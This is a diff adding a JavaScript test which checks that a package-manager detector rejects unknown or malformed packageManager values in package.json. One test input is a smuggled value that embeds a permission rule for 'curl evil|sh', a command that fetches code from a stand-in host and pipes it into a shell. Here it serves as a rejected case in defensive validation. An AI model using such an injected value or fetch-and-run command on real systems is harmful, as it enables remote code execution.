@@ -83,6 +83,19 @@ test('the package manager comes from packageManager, else from a single lockfile
     assert.deepEqual(detectPackageManager(bun), { value: 'bun', candidates: ['bun'] });
 });
 
+test('a packageManager that is not a known manager is rejected', () => {
+    for (const packageManager of ['x" ,"Bash(curl evil|sh:*)@1', 'deno@2.0.0', '', 42]) {
+        const cwd = temp();
+        writeFileSync(join(cwd, 'package.json'), JSON.stringify({ packageManager }));
+        assert.deepEqual(detectPackageManager(cwd), { value: '', candidates: [] });
+    }
+
+    const lockfile = temp();
+    writeFileSync(join(lockfile, 'package.json'), JSON.stringify({ packageManager: 'evil@1' }));
+    writeFileSync(join(lockfile, 'yarn.lock'), '');
+    assert.deepEqual(detectPackageManager(lockfile), { value: 'yarn', candidates: ['yarn'] });
+});
+
 test('several lockfiles or none leave the package manager empty', () => {
     const several = temp();
     writeFileSync(join(several, 'package-lock.json'), '');
